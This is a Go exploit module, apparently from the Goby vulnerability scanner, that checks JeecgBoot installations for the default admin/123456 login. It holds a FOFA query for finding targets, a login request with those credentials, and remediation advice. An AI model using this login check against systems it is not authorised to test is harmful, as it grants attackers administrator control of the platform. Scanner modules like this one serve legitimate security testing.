package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "JeecgBoot Default Password Vulnerability",
    "Description": "<p>JeecgBoot is a low -code development platform based on code generator.</p><p>JeecgBoot has a default password of admin/123456.</p>",
    "Product": "JEECGBOOT-Ent-Low-CP",
    "Homepage": "http://www.jeecg.com/",
    "DisclosureDate": "2023-03-07",
    "Author": "sunying",
    "FofaQuery": "title==\"JeecgBoot 企业级低代码平台\"",
    "GobyQuery": "title==\"JeecgBoot 企业级低代码平台\"",
    "Level": "2",
    "Impact": "<p>Attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [
        "http://www.jeecg.com/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/jeecgboot/sys/login",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/json"
                },
                "data_type": "text",
                "data": "{\"username\":\"admin\",\"password\":\"123456\"}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "登录成功",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"success\":true",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "JeecgBoot 开发平台默认口令漏洞",
            "Product": "JeecgBoot-企业级低代码平台",
            "Description": "<p>JeecgBoot是一款基于代码生成器的低代码开发平台。</p><p>JeecgBoot 存在默认口令 admin/123456。</p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>攻击者可通过默认口令漏洞控制整个平台，使用管理员权限操作核心的功能。\t<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "JeecgBoot Default Password Vulnerability",
            "Product": "JEECGBOOT-Ent-Low-CP",
            "Description": "<p>JeecgBoot is a low -code development platform based on code generator.</p><p>JeecgBoot has a default password of admin/123456.</p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>Attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "7375"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cfg := httpclient.NewPostRequestConfig("/jeecgboot/sys/login")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/json")
			cfg.Data = `{"username":"admin","password":"123456"}`
			//发包
			if response, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if response.StatusCode == 200 {
					if strings.Contains(response.RawBody, `"success":true`) && strings.Contains(response.RawBody, `登录成功`) {
						expResult.Success = true
						expResult.OutputType = "html"
						expResult.Output += "账号:admin<br/>密码:123456"
					}
				}
			}
			return expResult
		},
	))
}
